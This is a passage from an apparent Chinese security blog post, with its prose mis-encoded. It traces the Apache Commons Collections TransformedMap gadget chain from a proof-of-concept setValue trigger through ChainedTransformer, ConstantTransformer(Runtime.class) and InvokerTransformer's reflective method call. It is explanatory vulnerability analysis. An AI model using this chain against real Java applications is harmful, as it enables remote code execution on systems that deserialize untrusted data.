</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>outerMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TransformedMap</span><span class=p>.</span><span class=na>decorate</span><span class=p>(</span><span class=n>innerMap</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=n>transformerChain</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=p>.</span><span class=na>Entry</span><span class=w> </span><span class=n>onlyElement</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Map</span><span class=p>.</span><span class=na>Entry</span><span class=p>)</span><span class=w> </span><span class=n>outerMap</span><span class=p>.</span><span class=na>entrySet</span><span class=p>().</span><span class=na>iterator</span><span class=p>().</span><span class=na>next</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=c1>//è§¦å‘æ¼æ´</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>onlyElement</span><span class=p>.</span><span class=na>setValue</span><span class=p>(</span><span class=s>&#34;foobar&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=pocè°ƒç”¨åˆ†æ>PoCè°ƒç”¨åˆ†æ</h4><p>å…ˆdebugçœ‹çœ‹è°ƒç”¨é“¾ï¼Œæ•´ä¸ªè¿‡ç¨‹ä»<code>onlyElement.setValue("foobar")</code>â€‹å¼€å§‹ï¼Œæ¯æ®µä»£ç åªå–ç›¸å…³çš„ç‰‡æ®µã€‚</p><p>æºç çš„æ³¨é‡Šéœ€è¦ä¸‹è½½<a class=link href=https://archive.apache.org/dist/commons/collections/ target=_blank rel=noopener>CommonsCollectionsæºç </a>æŸ¥çœ‹ï¼Œdebugæ—¶æ˜¯æ²¡æœ‰çš„ã€‚</p><h5 id=abstractinputcheckedmapdecorator>AbstractInputCheckedMapDecorator</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// org. apache. commons. collections. map. AbstractInputCheckedMapDecorator</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> 	</span><span class=kd>protected</span><span class=w> </span><span class=kd>abstract</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>checkSetValue</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>var1</span><span class=p>);</span><span class=c1>//3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Implementation of a map entry that checks additions via setValue.
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>static</span><span class=w> </span><span class=kd>class</span> <span class=nc>MapEntry</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>AbstractMapEntryDecorator</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>AbstractInputCheckedMapDecorator</span><span class=w> </span><span class=n>parent</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=cm>/** The parent map */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>protected</span><span class=w> </span><span class=nf>MapEntry</span><span class=p>(</span><span class=n>Map</span><span class=p>.</span><span class=na>Entry</span><span class=w> </span><span class=n>entry</span><span class=p>,</span><span class=w> </span><span class=n>AbstractInputCheckedMapDecorator</span><span class=w> </span><span class=n>parent</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>super</span><span class=p>(</span><span class=n>entry</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>this</span><span class=p>.</span><span class=na>parent</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>parent</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>setValue</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>parent</span><span class=p>.</span><span class=na>checkSetValue</span><span class=p>(</span><span class=n>value</span><span class=p>);</span><span class=c1>//2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>entry</span><span class=p>.</span><span class=na>setValue</span><span class=p>(</span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å¦‚ä»£ç æ³¨é‡Šé‡Œçš„é¡ºåºæ‰€ç¤ºï¼Œç¨‹åºå…ˆåˆ°AbstractInputCheckedMapDecoratorçš„å­ç±»MapEntryï¼Œåœ¨2å¤„è°ƒç”¨3å¤„çš„checkSetValueï¼Œä½†æ˜¯è¿™é‡Œçš„checkSetValueæ˜¯æŠ½è±¡å‡½æ•°ï¼Œç¨‹åºè¿è¡Œæ—¶ä¼šæ ¹æ®å®ä¾‹è°ƒç”¨å¯¹åº”çš„å®ç°ã€‚</p><p>checkSetValueå¯¹åº”çš„å®ç°æœ‰ä¸¤ä¸ªå¦‚ä¸‹ï¼š</p><p>â€‹<img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/image-20241125150037-fmwbr10.png loading=lazy alt=image>â€‹</p><p>æ ¹æ®PoCçš„ä»£ç ï¼Œè¿™é‡Œä¼šæ‰§è¡ŒTransformMapé‡Œå®šä¹‰çš„checkSetValueã€‚</p><h5 id=transformedmap>TransformedMap</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// org. apache. commons. collections. map. TransformedMap extends AbstractInputCheckedMapDecorator</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=c1>// </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>protected</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Transformer</span><span class=w> </span><span class=n>keyTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>protected</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Transformer</span><span class=w> </span><span class=n>valueTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Factory method to create a transforming map.
</span></span></span><span class=line><span class=cl><span class=cm>     * &lt;p&gt;
</span></span></span><span class=line><span class=cl><span class=cm>     * If there are any elements already in the map being decorated, they
</span></span></span><span class=line><span class=cl><span class=cm>     * are NOT transformed.
</span></span></span><span class=line><span class=cl><span class=cm>     * Constrast this with {@link #decorateTransform}.
</span></span></span><span class=line><span class=cl><span class=cm>     * 
</span></span></span><span class=line><span class=cl><span class=cm>     * @param map  the map to decorate, must not be null
</span></span></span><span class=line><span class=cl><span class=cm>     * @param keyTransformer  the transformer to use for key conversion, null means no transformation
</span></span></span><span class=line><span class=cl><span class=cm>     * @param valueTransformer  the transformer to use for value conversion, null means no transformation
</span></span></span><span class=line><span class=cl><span class=cm>     * @throws IllegalArgumentException if map is null
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Map</span><span class=w> </span><span class=nf>decorate</span><span class=p>(</span><span class=n>Map</span><span class=w> </span><span class=n>map</span><span class=p>,</span><span class=w> </span><span class=n>Transformer</span><span class=w> </span><span class=n>keyTransformer</span><span class=p>,</span><span class=w> </span><span class=n>Transformer</span><span class=w> </span><span class=n>valueTransformer</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformedMap</span><span class=p>(</span><span class=n>map</span><span class=p>,</span><span class=w> </span><span class=n>keyTransformer</span><span class=p>,</span><span class=w> </span><span class=n>valueTransformer</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Constructor that wraps (not copies).
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>protected</span><span class=w> </span><span class=nf>TransformedMap</span><span class=p>(</span><span class=n>Map</span><span class=w> </span><span class=n>map</span><span class=p>,</span><span class=w> </span><span class=n>Transformer</span><span class=w> </span><span class=n>keyTransformer</span><span class=p>,</span><span class=w> </span><span class=n>Transformer</span><span class=w> </span><span class=n>valueTransformer</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>super</span><span class=p>(</span><span class=n>map</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>keyTransformer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>keyTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>valueTransformer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>valueTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Override to transform the value when using &lt;code&gt;setValue&lt;/code&gt;.
</span></span></span><span class=line><span class=cl><span class=cm>     * 
</span></span></span><span class=line><span class=cl><span class=cm>     * @param value  the value to transform
</span></span></span><span class=line><span class=cl><span class=cm>     * @return the transformed value
</span></span></span><span class=line><span class=cl><span class=cm>     * @since Commons Collections 3.1
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>protected</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>checkSetValue</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>valueTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>(</span><span class=n>value</span><span class=p>);</span><span class=c1>//2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>è¯¥ç±»æ˜¯å¯¹ä¸Šæ–‡AbstractInputCheckedMapDecoratorçš„ç»§æ‰¿ï¼Œå®ç°äº†checkSetValueã€‚</p><p>è¯¥ç±»è¿˜ä¸PoCä¸­<code>Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain)</code>â€‹æœ‰å…³ã€‚</p><p>PoCä¸­æ„é€ çš„transformerså˜é‡å…ˆåˆ°transformerChainå†åˆ°outerMapï¼ŒouterMapæ˜¯TransformedMapç±»å‹çš„ä¸€ä¸ªå®ä¾‹ã€‚</p><p>2å¤„çš„transformæ˜¯æ¥å£Transformerä¸­å®šä¹‰çš„ç±»ï¼Œç¨‹åºè¿è¡Œæ—¶ä¼šæ ¹æ®å®ä¾‹è°ƒç”¨å¯¹åº”çš„å®ç°ã€‚</p><p>transformå¯¹åº”çš„å®ç°æœ‰21ä¸ªå¦‚ä¸‹ï¼š</p><p>â€‹<img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/image-20240908150459-4aix5gt.png loading=lazy alt=image>â€‹</p><p>æ ¹æ®PoCä¸­çš„ä»£ç ï¼Œè¿™é‡Œä¼šè¿è¡ŒChainedTransformerç±»å®ç°çš„transformã€‚</p><h5 id=chainedtransformer>ChainedTransformer</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// org. apache. commons. collections. functors. ChainedTransformer implements Transformer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Transformer</span><span class=o>[]</span><span class=w> </span><span class=n>iTransformers</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Transforms the input to result via each decorated transformer
</span></span></span><span class=line><span class=cl><span class=cm>     * 
</span></span></span><span class=line><span class=cl><span class=cm>     * @param object  the input object passed to the first transformer
</span></span></span><span class=line><span class=cl><span class=cm>     * @return the transformed result
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>transform</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>object</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>iTransformers</span><span class=p>.</span><span class=na>length</span><span class=p>;</span><span class=w> </span><span class=o>++</span><span class=n>i</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>object</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>iTransformers</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>.</span><span class=na>transform</span><span class=p>(</span><span class=n>object</span><span class=p>);</span><span class=c1>//2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>object</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>ChainedTransformerå®ç°äº†Transformeræ¥å£ï¼Œå®ç°äº†transformã€‚</p><p>2å¤„çš„transformä¹Ÿæ˜¯æ¥å£Transformerä¸­å®šä¹‰çš„ç±»ï¼Œç¨‹åºè¿è¡Œæ—¶ä¼šæ ¹æ®å®ä¾‹è°ƒç”¨å¯¹åº”çš„å®ç°ã€‚</p><p>transformå¯¹åº”çš„å®ç°æœ‰21ä¸ªå¦‚ä¸‹ï¼š</p><p>â€‹<img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/image-20240908150459-4aix5gt.png loading=lazy alt=image>â€‹</p><p>æ ¹æ®PoCä¸­transformerså˜é‡çš„å®šä¹‰ï¼Œè¯¥å¾ªç¯ä¼šå…ˆè°ƒç”¨ä¸€æ¬¡ConstantTransformerä¸­å®ç°çš„transformï¼Œå†è°ƒç”¨ä¸‰æ¬¡InvokerTransformerä¸­å®ç°çš„transformã€‚</p><h5 id=constanttransformer>ConstantTransformer</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w> </span><span class=c1>// org. apache. commons. collections. functors. ConstantTransformer implements Transformer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>iConstant</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>ConstantTransformer</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>constantToReturn</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>iConstant</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>constantToReturn</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Transforms the input by ignoring it and returning the stored constant instead.
</span></span></span><span class=line><span class=cl><span class=cm>     * 
</span></span></span><span class=line><span class=cl><span class=cm>     * @param input  the input object which is ignored
</span></span></span><span class=line><span class=cl><span class=cm>     * @return the stored constant
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>transform</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>input</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>iConstant</span><span class=p>;</span><span class=c1>//2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>æ ¹æ®PoCä¸­<code>new ConstantTransformer(Runtime.class)</code>â€‹ï¼Œ2å¤„è¿”å›çš„æ˜¯java.lang.Runtimeã€‚</p><p>ç”±æ­¤å¯è§PoCä¸­<code>onlyElement.setValue("foobar")</code>â€‹ï¼Œå€¼ä¸ºå¤šå°‘éƒ½æ— æ‰€è°“ã€‚</p><h5 id=invokertransformer>InvokerTransformer</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// org. apache. commons. collections. functors. InvokerTransformer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>iMethodName</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=n>iParamTypes</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>iArgs</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Constructor that performs no validation.
</span></span></span><span class=line><span class=cl><span class=cm>     * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.
</span></span></span><span class=line><span class=cl><span class=cm>     * 
</span></span></span><span class=line><span class=cl><span class=cm>     * @param methodName  the method to call
</span></span></span><span class=line><span class=cl><span class=cm>     * @param paramTypes  the constructor parameter types, not cloned
</span></span></span><span class=line><span class=cl><span class=cm>     * @param args  the constructor arguments, not cloned
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>InvokerTransformer</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>methodName</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=n>paramTypes</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>iMethodName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>methodName</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>iParamTypes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>paramTypes</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>iArgs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>args</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Transforms the input to result by invoking a method on the input.
</span></span></span><span class=line><span class=cl><span class=cm>     * 
</span></span></span><span class=line><span class=cl><span class=cm>     * @param input  the input object to transform
</span></span></span><span class=line><span class=cl><span class=cm>     * @return the transformed result, null if null input
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>transform</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>input</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>input</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Class</span><span class=w> </span><span class=n>cls</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>input</span><span class=p>.</span><span class=na>getClass</span><span class=p>();</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Method</span><span class=w> </span><span class=n>method</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>cls</span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=n>iMethodName</span><span class=p>,</span><span class=w> </span><span class=n>iParamTypes</span><span class=p>);</span><span class=c1>//2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>method</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>input</span><span class=p>,</span><span class=w> </span><span class=n>iArgs</span><span class=p>);</span><span class=c1>//3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>NoSuchMethodException</span><span class=w> </span><span class=n>ex</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FunctorException</span><span class=p>(</span><span class=s>&#34;InvokerTransformer: The method &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>iMethodName</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; on &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>input</span><span class=p>.</span><span class=na>getClass</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; does not exist&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IllegalAccessException</span><span class=w> </span><span class=n>ex</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FunctorException</span><span class=p>(</span><span class=s>&#34;InvokerTransformer: The method &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>iMethodName</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; on &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>input</span><span class=p>.</span><span class=na>getClass</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; cannot be accessed&#34;</span><span class=p>);</span><span class=w>
